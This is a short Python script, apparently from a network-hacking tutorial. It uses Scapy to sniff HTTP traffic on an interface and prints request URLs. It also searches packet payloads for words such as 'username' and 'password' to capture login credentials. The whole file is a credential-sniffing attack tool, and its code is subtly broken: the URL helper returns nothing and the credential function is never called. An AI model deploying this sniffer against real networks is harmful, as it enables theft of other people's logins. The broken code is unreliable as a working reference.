#best for HTTP websites....getting URLs

import scapy.all as scapy
from scapy.layers import http

# store tells Scapy not to store packets in memory, which is what =False is for 
# prn calls for the process_sniffed_packet function to execute every time a packet is sent

def sniff(interface):
	return scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = str(packet[scapy.Raw].load)
		keywords = ["username", "user", "login", "password", "pass"]
		for keyword in keywords:
			if keyword in load:
				return load 

# If the packet has a HTTP request layer

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):		
		url = get_url(packet)
		print("[+] HTTP Request >> " + str(url))	

def login_info(packet):
	login_info = get_login_info(packet)
	if login_info:
			print("\n\n[+] Possible username/password > " + login_info + "\n\n")

# "eth0" is the interface connected to the internet

sniff("eth0") 
